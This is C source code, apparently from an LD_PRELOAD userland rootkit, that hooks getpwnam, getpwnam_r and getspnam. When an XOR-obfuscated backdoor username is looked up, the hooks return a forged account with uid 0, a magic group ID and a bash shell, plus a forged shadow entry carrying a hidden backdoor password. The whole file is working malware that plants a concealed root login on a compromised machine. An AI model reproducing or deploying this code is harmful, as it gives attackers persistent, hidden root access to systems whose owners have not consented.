struct passwd *getpwnam(const char *name)
{
    hook(CGETPWNAM);

    if(!xstrncmp(BD_UNAME, name))
    {
        struct passwd *bpw = call(CGETPWNAM, "root");

        xor(bd_uname, BD_UNAME);
        bpw->pw_name = strdup(bd_uname);
        clean(bd_uname);
        bpw->pw_uid = 0;
        bpw->pw_gid = MAGIC_GID;

        char home[PATH_MAX];
        xor(idir, INSTALL_DIR);
        (void)snprintf(home, sizeof(home), "%s", idir);
        clean(idir);

        bpw->pw_dir = strdup(home);
        bpw->pw_shell = "/bin/bash";

        return bpw;
    }

    return call(CGETPWNAM, name);
}

int getpwnam_r(const char *name, struct passwd *pwd, char *buf, size_t buflen, struct passwd **result)
{
    hook(CGETPWNAM_R);

    if(!xstrncmp(BD_UNAME, name))
    {
        (void)call(CGETPWNAM_R, "root", pwd, buf, buflen, result);

        xor(bd_uname, BD_UNAME);
        pwd->pw_name = strdup(bd_uname);
        clean(bd_uname);
        pwd->pw_uid = 0;
        pwd->pw_gid = MAGIC_GID;

        char home[PATH_MAX];
        xor(idir, INSTALL_DIR);
        (void)snprintf(home, sizeof(home), "%s", idir);
        clean(idir);

        pwd->pw_dir = strdup(home);
        pwd->pw_shell = "/bin/bash";

        return 0;
    }

    return (long)call(CGETPWNAM_R, name, pwd, buf, buflen, result);
}

struct spwd *getspnam(const char *name)
{
    if(!xstrncmp(BD_UNAME, name))
    {
        struct spwd *bspwd = malloc(sizeof(struct spwd));

        xor(bd_uname, BD_UNAME);
        bspwd->sp_namp = strdup(bd_uname);
        clean(bd_uname);
        xor(bd_pwd, BD_PWD);
        bspwd->sp_pwdp = strdup(bd_pwd);
        clean(bd_pwd);
        bspwd->sp_lstchg = time(NULL) / (60 * 60 * 24);
        bspwd->sp_expire = time(NULL) / (60 * 60 * 24) + 90;
        bspwd->sp_inact = 9001;
        bspwd->sp_warn = 0;
        bspwd->sp_min = 0;
        bspwd->sp_max = 99999;

        return bspwd;

    }

    hook(CGETSPNAM);
    return call(CGETSPNAM, name);
}
